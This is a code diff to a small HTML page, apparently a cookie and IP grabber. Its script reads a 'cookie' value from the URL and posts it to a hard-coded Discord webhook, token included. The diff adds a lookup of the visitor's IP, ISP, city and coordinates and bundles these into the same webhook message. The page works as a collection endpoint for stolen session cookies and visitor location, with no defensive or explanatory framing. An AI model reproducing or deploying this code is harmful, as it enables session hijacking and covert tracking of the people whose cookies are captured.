@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Info</title>
+    <title>Cookie & IP Info</title>
     <style>
         body {
             background-color: #000;
@@ -27,54 +27,99 @@
     <script>
         const params = new URLSearchParams(window.location.search);
         const container = document.getElementById('container');
-
         const cv = params.get('cookie');
-        if (cv) {
-            const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
-            fetch(wb, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: cv })
-            }).catch(console.error);
+        const ipFlag = window.location.search.includes('?ip');
+
+        // Function to fetch IP info
+        async function fetchIPInfo() {
+            try {
+                const res = await fetch("https://ipwhois.app/json/");
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    isp: data.isp || 'Unknown',
+                    org: data.org || 'Unknown',
+                    asn: data.asn || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
+                    lat: data.latitude || 'Unknown',
+                    lon: data.longitude || 'Unknown'
+                };
+            } catch (err) {
+                console.error("IP fetch error", err);
+                return null;
+            }
         }
 
-        if (window.location.search.includes("?ip")) {
-            fetch("https://ipwhois.app/json/")
-            .then(res => res.json())
-            .then(data => {
+        // Show info on page
+        function showInfo(infoLines) {
+            let index = 0;
+            function showNext() {
+                if (index >= infoLines.length) return;
+                const line = document.createElement('div');
+                line.className = 'line';
+                line.textContent = infoLines[index];
+                container.appendChild(line);
+                setTimeout(() => {
+                    line.style.opacity = 1;
+                    index++;
+                    setTimeout(showNext, 400);
+                }, 100);
+            }
+            showNext();
+        }
+
+        // Main logic
+        (async () => {
+            let ipData = null;
+            if (ipFlag) {
+                ipData = await fetchIPInfo();
+            }
+
+            // Display IP info on page
+            if (ipData) {
                 const infoLines = [
-                    `IP ADDRESS: ${data.ip || 'Unknown'}`,
-                    `ISP: ${data.isp || 'Unknown'}`,
-                    `ORG: ${data.org || 'Unknown'}`,
-                    `ASN: ${data.asn || 'Unknown'}`,
-                    `CITY: ${data.city || 'Unknown'}`,
-                    `REGION: ${data.region || 'Unknown'}`,
-                    `COUNTRY: ${data.country || 'Unknown'}`,
-                    `TIMEZONE: ${data.timezone || 'Unknown'}`,
-                    `LATITUDE: ${data.latitude || 'Unknown'}`,
-                    `LONGITUDE: ${data.longitude || 'Unknown'}`
+                    `IP ADDRESS: ${ipData.ip}`,
+                    `ISP: ${ipData.isp}`,
+                    `ORG: ${ipData.org}`,
+                    `ASN: ${ipData.asn}`,
+                    `CITY: ${ipData.city}`,
+                    `REGION: ${ipData.region}`,
+                    `COUNTRY: ${ipData.country}`,
+                    `TIMEZONE: ${ipData.timezone}`,
+                    `LATITUDE: ${ipData.lat}`,
+                    `LONGITUDE: ${ipData.lon}`
                 ];
+                showInfo(infoLines);
+            }
 
-                let index = 0;
-                function showNext() {
-                    if (index >= infoLines.length) return;
-                    const line = document.createElement('div');
-                    line.className = 'line';
-                    line.textContent = infoLines[index];
-                    container.appendChild(line);
-                    setTimeout(() => {
-                        line.style.opacity = 1;
-                        index++;
-                        setTimeout(showNext, 400);
-                    }, 100);
-                }
-                showNext();
-            })
-            .catch(err => {
-                container.innerHTML = `<div class="line">Error fetching IP info</div>`;
-                console.error(err);
-            });
-        }
+            // Send Discord webhook if cookie exists
+            if (cv) {
+                const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
+                const embed = {
+                    embeds: [{
+                        title: "Cookie & IP Info",
+                        color: 0xff3333,
+                        fields: [
+                            { name: "Cookie", value: `\`\`\`${cv}\`\`\`` },
+                            ipData ? { name: "IP Info", value:
+                                `IP: ${ipData.ip}\nISP: ${ipData.isp}\nORG: ${ipData.org}\nASN: ${ipData.asn}\nCity: ${ipData.city}\nRegion: ${ipData.region}\nCountry: ${ipData.country}\nTimezone: ${ipData.timezone}\nLat/Lon: ${ipData.lat}, ${ipData.lon}`
+                            } : { name: "IP Info", value: "Not available" }
+                        ]
+                    }]
+                };
+
+                fetch(wb, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embed)
+                })
+                .then(() => console.log("Webhook sent"))
+                .catch(err => console.error("Webhook error", err));
+            }
+        })();
     </script>
 </body>
 </html>
